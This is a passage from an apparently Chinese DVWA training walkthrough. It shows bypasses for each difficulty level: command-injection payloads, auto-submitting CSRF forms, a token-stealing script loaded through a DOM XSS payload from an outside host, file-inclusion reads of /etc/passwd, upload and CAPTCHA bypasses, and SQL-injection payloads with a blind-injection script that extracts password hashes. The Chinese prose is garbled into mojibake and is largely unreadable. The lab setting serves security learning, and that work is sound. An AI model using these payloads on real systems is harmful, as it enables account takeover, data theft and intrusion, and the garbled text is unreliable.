(i , &#x27;admin&#x27; ,line.strip(),end=&quot; &quot;) user_token=get_token(requrl,header) if(i==20): break impossibleimpossibleåœ¨Highçš„åŸºç¡€ä¸Šè¿˜è®¾ç½®äº†éªŒè¯æ¬¡æ•°ï¼Œå½“è¾“å…¥å¯†ç é”™è¯¯3æ¬¡æ—¶å¿…é¡»ç­‰å¾…15åˆ†é’Ÿåæ‰èƒ½å†æ¬¡è¾“å…¥ã€‚å› æ­¤ï¼Œå½“å¯¹éªŒè¯æ¬¡æ•°è¿›è¡Œé™åˆ¶æˆ–è€…æ·»åŠ éªŒè¯ç ç­‰æƒ…å†µå‘ç”Ÿæ—¶ï¼Œæš´åŠ›ç ´è§£çš„æ–¹æ³•å°†è¢«æ’é™¤ã€‚ Command Injection åœ¨DVWA-master\\dvwa\\includesç›®å½•ä¸‹æ‰¾åˆ°dvwaPage.inc.phpæ–‡ä»¶ä¸­æ‰€æœ‰çš„â€charset=utf-8â€ï¼Œä¿®æ”¹â€charset=gb2312â€ï¼Œå³å¯è§£å†³æ–‡å­—ä¹±ç é—®é¢˜ã€‚ åœ¨ç»ƒä¹ æ”»é˜²ä¸–ç•Œæ—¶å°±æœ‰ä»‹ç»è¿‡ä¸€äº›å‘½ä»¤æ³¨å…¥äº†ã€‚é‚£æˆ‘ä»¬è¿˜æ˜¯å…ˆæ¥å›é¡¾ä¸‹linuxçš„å‘½ä»¤æ‹¼æ¥ç¬¦å·ï¼š A;B Aä¸è®ºæ­£ç¡®ä¸å¦éƒ½ä¼šæ‰§è¡ŒBå‘½ä»¤ A&amp;B Aåå°è¿è¡Œï¼›Aå’ŒBåŒæ—¶æ‰§è¡Œ A&amp;&amp;B Aæ‰§è¡ŒæˆåŠŸæ—¶å€™æ‰ä¼šæ‰§è¡ŒBå‘½ä»¤ A|B Aæ‰§è¡Œçš„è¾“å‡ºç»“æœï¼Œä½œä¸ºBå‘½ä»¤çš„å‚æ•°ï¼ŒAä¸è®ºæ­£ç¡®ä¸å¦éƒ½ä¼šæ‰§è¡ŒBå‘½ä»¤ A||B A æ‰§è¡Œå¤±è´¥åæ‰ä¼šæ‰§è¡ŒBå‘½ä»¤ lowlowéš¾åº¦éƒ½æ˜¯æ²¡æœ‰è¿›è¡Œè¿‡æ»¤çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥æ„é€ å„ç§å‘½ä»¤è¿›è¡Œæ³¨å…¥ï¼Œè¿™é‡Œæ‹¿127.0.0.1&amp;&amp;whoamiä¸¾ä¾‹: mediumåœ¨è¿™ä¸ªéš¾åº¦ä¸‹è¿‡æ»¤äº†&amp;&amp;ä¸;ï¼Œä¸è¿‡ç”±äºæœ¬è´¨ä¸Šæ˜¯é»‘åå•æœºåˆ¶ï¼Œå› æ­¤è¿˜æ˜¯å­˜åœ¨æ¼æ´ï¼Œæˆ‘ä»¬åªéœ€è¦åˆ©ç”¨ä¸Šé¢æ²¡æœ‰è¢«è¿‡æ»¤çš„å‘½ä»¤æ‹¼æ¥ç¬¦å·å°±å¯ä»¥äº†ã€‚ä¾‹å¦‚ï¼š127.0.0.1&amp;whoami highè¿™é‡Œçš„è¿‡æ»¤å°±æ¯”è¾ƒç‹ äº†ï¼š 12345678910111213141516171819if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = trim($_REQUEST[ &#x27;ip&#x27; ]); // Set blacklist $substitutions = array( &#x27;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, &#x27;| &#x27; =&gt; &#x27;&#x27;, &#x27;-&#x27; =&gt; &#x27;&#x27;, &#x27;$&#x27; =&gt; &#x27;&#x27;, &#x27;(&#x27; =&gt; &#x27;&#x27;, &#x27;)&#x27; =&gt; &#x27;&#x27;, &#x27;`&#x27; =&gt; &#x27;&#x27;, &#x27;||&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™å·®ä¸å¤šæ˜¯è¿‡æ»¤å¹²å‡€äº†ï¼Œä¸è¿‡è¿™é‡Œæˆ‘ä»¬å‘ç°åœ¨è¿‡æ»¤|æ—¶çœŸæ­£è¿‡æ»¤çš„æ˜¯| ï¼Œè¿™ä¸ªåé¢æ˜¯æœ‰ä¸€ä¸ªç©ºæ ¼çš„ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬æ„é€ 127.0.0.1|whoamiå°±å¯ä»¥ç»•è¿‡äº†ã€‚ impossibleé‡‡ç”¨äº†ç™½åå•çš„å†™æ³•ï¼Œä¸ä»…åŠ å…¥äº†user_tokenè¿›è¡Œè®¤è¯ï¼Œè€Œä¸”è¿˜æ£€æµ‹è¢«.åˆ†å‰²çš„å„ä¸ªéƒ¨åˆ†æ˜¯å¦ä¸ºæ•°å­—ï¼Œå¦‚æœä¸ä¸ºæ•°å­—ç±»å‹åˆ™è¿”å›errorã€‚åœ¨è¿›è¡Œè¿‡æ»¤çš„è®¾ç½®æ—¶ï¼Œç™½åå•çš„å®‰å…¨æ€§è¿˜æ˜¯æ¯”å¾ˆåå•è¦é«˜å¾ˆå¤šçš„ã€‚ CSRFlowæˆ‘ä»¬ä¿®æ”¹å¯†ç åå‘ç°å‘é€çš„æ˜¯GETè¯·æ±‚ï¼ŒURLå¦‚ä¸‹ï¼š 1http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change# å› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥æ„é€ ä¸€ä¸ªURLï¼Œç‚¹å‡»ä¹‹åä¾¿å¯ä»¥ç›´æ¥ä¿®æ”¹å¯†ç ï¼š 1http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=mrl64&amp;password_conf=mrl64&amp;Change=Change# å½“ç„¶åœ¨è¿›è¡ŒCSRFæ”»å‡»æ—¶è‚¯å®šä¸èƒ½å¦‚æ­¤ç›´ç™½åœ°æ”»å‡»ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å¥—ä¸€ä¸ªçŸ­åŸŸåè¿›è¡Œä¼ªè£…ï¼Œæˆ–è€…ç¼–å†™HTMLä»£ç ï¼Œå¹¶å°†æ”»å‡»ç”¨çš„URLè—åŒ¿èµ·æ¥ã€‚å¦‚æœè¦ç¼–å†™HTMLè¿›è¡Œæ”»å‡»çš„è¯ï¼Œåªè¦æ ‡ç­¾æ”¯æŒsrcéƒ½å¯ä»¥å°è¯•è¿›è¡Œè—åŒ¿ï¼Œæ¯”è¾ƒå¸¸ç”¨çš„æœ‰scirptã€iframeä»¥åŠimgï¼š 12345678910111213&lt;html&gt;&lt;head&gt; &lt;title&gt;CSRF&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;img src=&quot;http://127.0.0.1/vulnerabilities/csrf/?password_new=mrl64&amp;password_conf=mrl64&amp;Change=Change#&quot;&gt;&lt;!--&lt;iframe src=&quot;http://127.0.0.1/vulnerabilities/csrf/?password_new=mrl64&amp;password_conf=mrl64&amp;Change=Change#&quot; style=&quot;display:none;&quot;&gt;&lt;/iframe&gt;--&gt;&lt;!--&lt;script src=&quot;http://127.0.0.1/vulnerabilities/csrf/?password_new=mrl64&amp;password_conf=mrl64&amp;Change=Change#&quot;&gt;&lt;/script&gt;--&gt;&lt;/body&gt;&lt;/html&gt; mediumè¿™ä¸ªéš¾åº¦ä¸‹å¤šè¿›è¡Œäº†ä¸€æ¬¡Refererçš„æ¯”è¾ƒåˆ¤æ–­ï¼š 1if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) spripos(string,find[,start])ï¼šä»startä½ç½®å¼€å§‹æŸ¥æ‰¾findä¸­stringç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½® å› æ­¤æˆ‘ä»¬éœ€è¦å¯¹Refererçš„å€¼è¿›è¡Œæ ¡æ­£ï¼Œåœ¨æœ¬åœ°ç¯å¢ƒä¸‹è‡ªç„¶å¯ä»¥ç”¨burp suiteå·¥å…·æŠ“åŒ…æ›´æ”¹è¯·æ±‚å¤´ï¼Œä½†æ˜¯å®æˆ˜ä¸­ä¸ä¼šæœ‰äººå¥½å¿ƒå¸®ä½ æ›´æ”¹Refererçš„ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦æ„å»ºè¡¨å•æ¥è¿›è¡Œç»•è¿‡ï¼š 123456789101112131415&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;CSRF&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form method=&quot;get&quot; id=&quot;csrf&quot; action=&quot;http://127.0.0.1/vulnerabilities/csrf/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;mrl64&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;mrl64&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;&lt;/form&gt;&lt;script&gt; document.forms[&quot;csrf&quot;].submit(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; è¿™é‡Œç”¨åˆ°äº†&lt;script&gt; document.forms[&quot;csrf&quot;].submit(); &lt;/script&gt;è¿›è¡Œäº†å¯¹idä¸ºcsrfè¡¨å•çš„è‡ªåŠ¨æäº¤ æœ€åè®©ç”¨æˆ·è®¿é—®urlå¹¶è‡ªåŠ¨æäº¤å³å¯ï¼š 123456789ç›®å½•æ··æ·†æ³•ï¼šå°†HTMLé¡µé¢æ”¾åœ¨127.0.0.1ç›®å½•ä¸‹ï¼Œæ„å»ºpayloadhttp://www.mrl64.com/127.0.0.1/csrf.htmlæ–‡ä»¶åæ··æ·†æ³•ï¼šå°†HTMLæ–‡ä»¶é‡å‘½åä¸º127.0.0.1ï¼Œæ„å»ºpayloadhttp://www.mrl64.com/127.0.0.1.htmlé—®å·æ‹¼æ¥æ³•ï¼šç”±äºHTMLä¸æ¥å—å‚æ•°ï¼Œå› æ­¤éšä¾¿è¾“å…¥éƒ½å¯ä»¥ç»•è¿‡refereræ£€æµ‹http://www.mrl64.com/csrf.html?mrl64â€¦â€¦ highè¿™å…³å¢åŠ äº†tokenæ£€æµ‹ï¼Œæˆ‘ä»¬å¿…é¡»è¦è·å–ç”¨æˆ·çš„tokenæ‰èƒ½è¿›è¡Œæ”»å‡»ã€‚å¦‚æœæˆ‘ä»¬èƒ½æˆåŠŸå°†HTMLä¿å­˜åˆ°è·¨åŸŸç™½åå•ä¸Šï¼Œè‡ªç„¶ç›´æ¥é€šè¿‡æ„å»ºç»„åˆå¼CSRFè¡¨å•å†è®¿é—®å°±å¯ä»¥äº†ã€‚ä½†è¿™ä¸ªå‰ææ˜¯å¾ˆéš¾åšåˆ°çš„ï¼Œå› æ­¤éœ€è¦é€šè¿‡JSå‘èµ·è¯·æ±‚å¹¶é…åˆXSSè¿›è¡Œã€‚ æ–°å»ºä¸€ä¸ªJSï¼š 123456789101112131415161718192021222324252627282930// é¦–å…ˆè®¿é—®è¿™ä¸ªé¡µé¢ æ¥è·å– tokenvar tokenUrl = &#x27;http://127.0.0.1/vulnerabilities/csrf/&#x27;; if(window.XMLHttpRequest) &#123; xmlhttp = new XMLHttpRequest();&#125;else&#123; xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);&#125; var count = 0;xmlhttp.withCredentials = true;xmlhttp.onreadystatechange=function()&#123; if(xmlhttp.readyState ==4 &amp;&amp; xmlhttp.status==200) &#123; // ä½¿ç”¨æ­£åˆ™æå– token var text = xmlhttp.responseText; var regex = /user_token\\&#x27; value\\=\\&#x27;(.*?)\\&#x27; \\/\\&gt;/; var match = text.match(regex); var token = match[1]; // å‘èµ· CSRF è¯·æ±‚ å°† token å¸¦å…¥ var new_url = &#x27;http://127.0.0.1/vulnerabilities/csrf/?user_token=&#x27;+token+&#x27;&amp;password_new=111&amp;password_conf=111&amp;Change=Change&#x27;; if(count==0)&#123; count++; xmlhttp.open(&quot;GET&quot;,new_url,false); xmlhttp.send(); &#125; &#125;&#125;;xmlhttp.open(&quot;GET&quot;,tokenUrl,false);xmlhttp.send(); å†™è¿™ä¸ªjsè¦æ±‚è¿˜æ˜¯æŒºé«˜çš„ï¼Œåæ­£æˆ‘ç°åœ¨å†™ä¸å‡ºæ¥ï¼Œç„¶åæŠŠè¿™ä¸ªjsä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šï¼Œåœ¨DOM SXXçš„Highä¸­å¼•å…¥è¿™ä¸ªjsï¼š 1http://127.0.0.1/vulnerabilities/xss_d/?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;script src=&quot;http://www.xxxx.com/csrf.js&quot;&gt;&lt;/script&gt; è®¿é—®ä¹‹åå°±æ”¹å¯†æˆåŠŸäº†ã€‚ impossibleå¢åŠ äº†éªŒè¯åˆå§‹å¯†ç çš„é€‰é¡¹ï¼Œè¿™åœ¨ç°å®ä¸­æ˜¯éå¸¸å¸¸è§çš„ä¿æŠ¤æœºåˆ¶ï¼ŒåŒæ ·è¿˜å¯ä»¥ä½¿ç”¨éªŒè¯ç ç­‰å…¶ä»–æ–¹å¼è¿›è¡Œä¿æŠ¤ï¼Œåœ¨è¿™äº›æƒ…å†µä¸‹CSRFæ”»å‡»æ˜¯æ— æ³•å‘èµ·çš„ã€‚ File Inclusionlowç»å…¸æ–‡ä»¶åŒ…å«é¢˜ç›®ï¼Œåœ¨lowç­‰çº§å®Œå…¨æ²¡æœ‰è¿‡æ»¤çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥åšè®¸å¤šçš„äº‹ï¼š è¯»å–æ–‡ä»¶ï¼šhttp://127.0.0.1/DVWA/vulnerabilities/fi/?page=/etc/passwdï¼ˆlinuxé™å®šï¼‰ è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼šhttp://127.0.0.1/DVWA/vulnerabilities/fi/?page=www.baidu.com/robots.txt æœ¬åœ°/è¿œç¨‹æ–‡ä»¶åŒ…å«Getshell ä¼ªåè®®ä½¿ç”¨ï¼šhttp://127.0.0.1/DVWA/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=index.php â€¦â€¦ mediumå¢åŠ äº†å¯¹http://ã€https://ã€../ã€..\\çš„è¿‡æ»¤ï¼Œä½†æ˜¯è¿‡æ»¤çš„æ–¹æ³•æ˜¯ä½¿ç”¨str_replace()å‡½æ•°ï¼Œè€Œä¸”æ²¡æœ‰åŒºåˆ†å¤§å°å†™ï¼Œå› æ­¤åŒå†™è¿‡æ»¤ä¸å¤§å°å†™è¿‡æ»¤å‡å¯ä½¿ç”¨ã€‚ ä¾‹å¦‚ï¼š 1http://127.0.0.1/DVWA/vulnerabilities/fi/?page=hthttptps://www.mrl64.com/csrf.html high12345if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125; è¿™é‡Œè¦æ±‚åŒ¹é…pageå‚æ•°çš„å¼€å¤´å¿…é¡»æ˜¯fileï¼Œå¦åˆ™æ‰§è¡Œexitç»“æŸç¨‹åºï¼Œå› æ­¤è¿™é‡Œåªèƒ½è¯»å–æ–‡ä»¶ï¼š 1http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file:///etc/passwd impossibleæ— æ‡ˆå¯å‡»çš„ç™½åå•åŒ¹é…ï¼Œä¸æ„§æ˜¯ä¸€ç”Ÿä¹‹æ•Œã€‚ 12345678910111213&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Only allow include.php or file&#123;1..3&#125;.phpif( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125;?&gt; File Uploadlowåˆ·äº†upload-labsåšè¿™ä¸ªå°±æ˜¯æ´’æ´’æ°´å•¦ã€‚é¦–å…ˆlowéš¾åº¦ä¸‹å¯¹æ–‡ä»¶åç¼€æ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œå› æ­¤ç›´æ¥ä¸Šä¼ muma1.phpï¼ˆ&lt;?php phpinfo();?&gt;ï¼‰æ–‡ä»¶å°±å¯ä»¥äº†ï¼Œå¹¶ä¸”è¿”å›äº†è·¯å¾„åœ°å€ï¼Œå› æ­¤ç›´æ¥è®¿é—®ã€‚ mediumupload-labså‰ä¸¤å…³çš„éš¾åº¦ï¼Œä¸Šä¼ jpgåæ”¹ä¸ºphpæˆ–è€…ä¸Šä¼ phpå¹¶ä¿®æ”¹Content-Typeéƒ½å¯ä»¥ç»•è¿‡æ£€æµ‹ï¼š high12345678910// File information$uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ];$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1);$uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ];$uploaded_tmp = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ];// Is it an image?if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; è¿™é‡Œå°±åªèƒ½ä¸Šä¼ å›¾ç‰‡äº†ï¼Œå› æ­¤æˆ‘ä»¬è¦ç”¨åˆ°å›¾ç‰‡ç ï¼Œé…åˆä¼ªåè®®è¯»å–å°±è¡Œäº†ã€‚ impossible1234567891011121314151617181920212223// Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &#x27;hackable/uploads/&#x27;; //$target_file = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;; $target_file = md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext; $temp_file = ( ( ini_get( &#x27;upload_tmp_dir&#x27; ) == &#x27;&#x27; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#x27;upload_tmp_dir&#x27; ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == &#x27;jpg&#x27; || strtolower( $uploaded_ext ) == &#x27;jpeg&#x27; || strtolower( $uploaded_ext ) == &#x27;png&#x27; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == &#x27;image/jpeg&#x27; || $uploaded_type == &#x27;image/png&#x27; ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == &#x27;image/jpeg&#x27; ) &#123; $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); &#125; else &#123; $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); &#125; imagedestroy( $img ); æ–‡ä»¶åéšæœºã€æ— æ³•æˆªæ–­ï¼Œæ— æ‡ˆå¯å‡»ã€‚ Insecure CAPTCHAé¢˜ç›®çš„æ„æ€æ˜¯ä¸å®‰å…¨çš„éªŒè¯ç ï¼Œæ—¢ç„¶å¦‚æ­¤ï¼Œå°±è¯´æ˜è¿™é¢˜çš„éªŒè¯ç æ˜¯å¯ä»¥è¢«ç»•è¿‡çš„ã€‚å¦‚æœåœ¨å‰ç«¯è®¾è®¡ä¸€ä¸ªä¸¥å¯†çš„ã€å®‰å…¨çš„éªŒè¯ç ï¼Œå°†ä¼šé˜»æ­¢å¤šç§æ”»å‡»æ–¹å¼çš„è¿›è¡Œï¼Œä½†æ˜¯å¦‚æœåƒDVWAé‡Œè¿™æ ·ä¸ä¸¥å¯†çš„è¯ï¼Œç»•è¿‡å°±æ˜¯åˆ†åˆ†é’Ÿçš„äº‹ã€‚ 12345$resp = recaptcha_check_answer( $_DVWA[ &#x27;recaptcha_private_key&#x27;], $_POST[&#x27;g-recaptcha-response&#x27;] ); DVWAä¸­çš„éªŒè¯ç è®¤è¯ä»£ç  ç”±äºéªŒè¯ç æ˜¯è°·æ­Œçš„ï¼Œå¦‚æœæ²¡æœ‰é­”æ³•ä¸Šç½‘é¡µé¢ä¼šåˆ·æ–°å¾ˆä¹…è€Œä¸”ä¸ä¼šæ˜¾ç¤ºå‡ºéªŒè¯ç ï¼Œä¸è¿‡è¿™ä¸å½±å“è§£é¢˜ï¼Œå› ä¸ºè¿™é¢˜ä¸­çš„éªŒè¯ç å°±æ˜¯æ‹¿æ¥ç»•è¿‡çš„ã€‚ lowå®¡è®¡æºç ï¼Œå‘ç°åç«¯å°†æ”¹å¯†è¿‡ç¨‹åˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤ï¼Œstep1æ˜¯éªŒè¯éªŒè¯ç æ˜¯å¦å­˜åœ¨ä¸æ­£ç¡®ï¼Œå¦‚æœæ­£ç¡®ï¼Œåˆ™è¿›å…¥step2è¿›è¡Œæ”¹å¯†æ“ä½œã€‚ä¸è¿‡ç”±äºæ²¡æœ‰ä»»ä½•éªŒè¯å‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥æŠ“åŒ…æ›´æ”¹stepçš„å€¼è¿›è¡Œç»•è¿‡ï¼šps.ç”±äºæ²¡æœ‰é­”æ³•ä¸Šç½‘å› æ­¤è¿™é‡Œæ²¡æœ‰éªŒè¯ç çš„è®¤è¯å‚æ•° ä¹‹åé€šè¿‡å°±å¯ä»¥æ”¹å¯†æˆåŠŸäº†ã€‚ medium12345if( !$_POST[ &#x27;passed_captcha&#x27; ] ) &#123; $html .= &quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;; $hide_form = false; return;&#125; æˆ‘ä»¬å‘ç°è¿™ä¸ªéš¾åº¦ä¸‹åœ¨step2ä¸­ä»¥POSTè¯·æ±‚çš„æ–¹å¼åŠ å…¥äº†passed_captchaè¿™ä¸ªå‚æ•°æ¥éªŒè¯æˆ‘ä»¬æ˜¯å¦è¿›è¡Œäº†step1ï¼Œä¸è¿‡å¦‚æœæˆ‘ä»¬çŸ¥é“äº†è¿™ä¸ªå‚æ•°çš„åå­—ï¼Œé‚£ä¹ˆè¿™å±‚é˜²æŠ¤ä¹Ÿå°†æ¯«æ— æ„ä¹‰ï¼Œå› ä¸ºåªè¦åœ¨æŠ“åŒ…é¡µé¢ä¸­è¡¥å……è¿™ä¸ªå‚æ•°å°±å¯ä»¥äº†ï¼š highæŸ¥çœ‹æºç ï¼Œå‘ç°è¿™æ¬¡å°†åˆ†æ­¥æ“ä½œæ”¹æˆäº†å•æ­¥æ“ä½œï¼Œå¹¶ä¸”åŠ äº†ä¸€ç‚¹éªšæ“ä½œè¿›å»ï¼š 12345678910111213$resp = recaptcha_check_answer( $_DVWA[ &#x27;recaptcha_private_key&#x27; ], $_POST[&#x27;g-recaptcha-response&#x27;]);if ( $resp || ( $_POST[ &#x27;g-recaptcha-response&#x27; ] == &#x27;hidd3n_valu3&#x27; &amp;&amp; $_SERVER[ &#x27;HTTP_USER_AGENT&#x27; ] == &#x27;reCAPTCHA&#x27; ) ) åœ¨ç¨‹åºä¸­ï¼Œåªè¦éªŒè¯ç æ­£ç¡®æˆ–è€…æ»¡è¶³åé¢ä¸€ä¸ªæ¡ä»¶å°±å¯ä»¥è¿›è¡Œæ”¹å¯†æ“ä½œã€‚ç”±äº$respæ˜¯æˆ‘ä»¬éœ€è¦ç»•è¿‡çš„ï¼Œå› æ­¤æˆ‘ä»¬çš„ç€æ‰‹ç‚¹å°±åœ¨åé¢é‚£ä¸ªæ¡ä»¶ã€‚POSTè¯·æ±‚ä¸€ä¸ªå€¼ä¸ºhidd3n_valu3çš„g-recaptcha-responseï¼Œå¹¶ä¸”éªŒè¯user_agentæ˜¯å¦ä¸ºreCAPTCHï¼Œé‚£è¿™ä¹Ÿæ˜¯ç›´æ¥æŠ“åŒ…æ›´æ”¹å°±å¥½äº†ï¼š impossibleç§»é™¤äº†highéš¾åº¦ä¸­çš„å¯ç»•è¿‡å‚æ•°åˆ¤æ–­ï¼Œå¹¶ä¸”è¦æ±‚è¾“å…¥åŸå¯†ç ï¼Œç”šè‡³é’ˆå¯¹CSRFä½¿ç”¨äº†anti-CSRF tokenï¼Œè¿™ä½¿å¾—éªŒè¯ç çš„ç»•è¿‡å‡ ä¹æ— è§£ã€‚ SQL Injectionè¿™äº›é¢˜éƒ½å¯ä»¥é€šè¿‡sqlmapè·‘å‡ºæ¥ï¼ˆ lowä»€ä¹ˆéƒ½æ²¡æœ‰è¿‡æ»¤çš„sqlæ³¨å…¥ï¼Œæˆ‘ä»¬å…ˆæµ‹è¯•å‘ç°æ³¨å…¥æ–¹å¼ä¸ºå­—ç¬¦å‹GETæ³¨å…¥ï¼Œå¹¶ä¸”urlæœ€åä¼šæœ‰ä¸€ä¸ª&amp;Submit=Submit#ï¼Œæ„å»ºpayloadæ—¶ä¸è¦å¿˜äº†ã€‚ä½†æ˜¯å½“æˆ‘ä»¬å†™å…¥è”åˆæ³¨å…¥æ—¶ï¼Œå‘ç”Ÿäº†æŠ¥é”™ï¼š ç»è¿‡æœç´¢å‘ç°æ˜¯å› ä¸ºç¼–ç æ··ä¹±å¯¼è‡´çš„é”™è¯¯ï¼Œå› æ­¤åœ¨æ„å»ºpayloadæ—¶æˆ‘ä»¬å°†æƒ³è¦è·å–çš„æ•°æ®ä»¥16è¿›åˆ¶çš„æ–¹å¼è¿”å›å³å¯ï¼Œæ„å»ºpayloadï¼ˆåˆ—æ•°ä¸º2ï¼‰ï¼š 1http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&#x27; union select 1,hex(concat(table_name)) from information_schema.tables where table_schema=database()--+&amp;Submit=Submit# æŸ¥å®Œè¡¨åå°±æ˜¯ä¸€æ¡é¾™æœåŠ¡äº†ï¼Œè¿™é‡Œå°±ä¸æ¼”ç¤ºäº†ã€‚ mediumè¿™æ¬¡æŠŠæ³¨å…¥æ–¹å¼æ¢æˆäº†POSTï¼Œä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰åšè¿‡æ»¤ï¼ŒæŠ“åŒ…æ›´æ”¹POSTå°±å¯ä»¥äº†ï¼Œè¿™æ¬¡æ”¹æˆäº†æ•°å­—å‹æ³¨å…¥ï¼š highä½¿ç”¨äº†sessioné˜²æ­¢è‡ªåŠ¨åŒ–æ”»å‡»ï¼ˆå®é™…ä¸Šå¥½åƒè¿˜æ˜¯èƒ½ç”¨ï¼‰ï¼Œä½†æ˜¯åœ¨æ‰‹å·¥äººé¢å‰è¿™ç§æ²¡æœ‰è¿‡æ»¤çš„æ³¨å…¥æ¯«æ— æ„ä¹‰ï¼Œç›´æ¥æŠ“åŒ…æ”¹åŒ…å°±å¯ä»¥äº†ï¼š impossibleæ£€æµ‹idæ˜¯å¦ä¸ºæ•°å­—ï¼Œå¹¶ä¸”è¿›è¡Œé¢„ç¼–è¯‘ï¼Œé˜²å¾¡æ‹‰æ»¡ï¼Œæ¯«æ— æ³¨å…¥å¯èƒ½ã€‚ SQL Injection (Blind)è¿™äº›é¢˜éƒ½å¯ä»¥é€šè¿‡sqlmapè·‘å‡ºæ¥ï¼ˆ lowGETç±»å‹çš„sqlç›²æ³¨é¢˜ï¼Œè€Œä¸”æ²¡æœ‰åšä»»ä½•çš„è¿‡æ»¤ï¼Œä½†æ˜¯ç”±äºDVWAçš„ç™»å½•æœºåˆ¶ï¼Œå› æ­¤å†™è„šæœ¬æ—¶è¦è®°å¾—å†™å…¥cookieï¼Œè¿™é‡Œç”¨äº†äºŒåˆ†æ³•ç¼–å†™å¸ƒå°”ç›²æ³¨çš„è„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132import requestsimport timeurl = &#x27;http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/&#x27;head = &#123;&#x27;Cookie&#x27;:&#x27;security=low;PHPSESSID=c2fad3pjoio31n2i15243jrb2n&#x27;&#125;s = requests.Session()flag = &#x27;&#x27;for i in range(1, 500): low = 32 high = 128 mid = (low + high) &gt;&gt; 1 while (low &lt; high): #æŸ¥åº“ #payload = &#x27;?id=1\\&#x27; and (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;)--+&amp;Submit=Submit#&#x27;.format(i, mid) #æŸ¥è¡¨ #payload = &#x27;?id=1\\&#x27; and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)--+&amp;Submit=Submit#&#x27;.format(i, mid) #æŸ¥åˆ— #payload = &#x27;?id=1\\&#x27; and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=\\&#x27;dvwa\\&#x27; and table_name=\\&#x27;users\\&#x27;),&#123;&#125;,1))&gt;&#123;&#125;)--+&amp;Submit=Submit#&#x27;.format(i, mid) #æŸ¥æ•°æ® payload = &#x27;?id=1\\&#x27; and (ascii(substr((select group_concat(user,password) from users),&#123;&#125;,1))&gt;&#123;&#125;)--+&amp;Submit=Submit#&#x27;.format(i, mid) time.sleep(0.05) if &quot;exists&quot; in s.get(url+payload, 